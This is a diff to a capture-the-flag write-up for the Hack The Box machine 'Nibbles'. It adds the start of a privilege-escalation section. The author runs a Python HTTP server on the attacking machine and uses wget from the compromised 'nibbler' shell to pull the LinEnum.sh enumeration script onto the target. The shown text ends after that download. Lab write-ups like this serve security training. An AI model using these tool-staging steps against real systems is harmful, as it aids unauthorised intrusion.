@@ -313,6 +313,26 @@ nibbler@Nibbles:~$ cat /home/nibbler/user.txt
 
 ### Privilege Escalation
 
-We're only `nibbler` — we need root.
+Objective: Escalate privileges and submit the root.txt flag.
 
-*Work in progress...*
+We're only `nibbler` — we need root. Lets get LinEnum on the box
+
+```Bash
+➜  Downloads sudo python3 -m http.server 8080                                                
+Serving HTTP on :: port 8080 (http://[::]:8080/) ...
+::ffff:10.129.123.151 - - [18/May/2026 14:18:34] "GET /LinEnum.sh HTTP/1.1" 200 -
+```
+
+```bash
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ wget http://10.10.15.150:8080/LinEnum.sh
+<ate/plugins/my_image$ wget http://10.10.15.150:8080/LinEnum.sh              
+--2026-05-18 16:18:36--  http://10.10.15.150:8080/LinEnum.sh
+Connecting to 10.10.15.150:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46631 (46K) [application/x-sh]
+Saving to: 'LinEnum.sh'
+
+LinEnum.sh          100%[===================>]  45.54K   142KB/s    in 0.3s    
+
+2026-05-18 16:18:37 (142 KB/s) - 'LinEnum.sh' saved [46631/46631]
+```
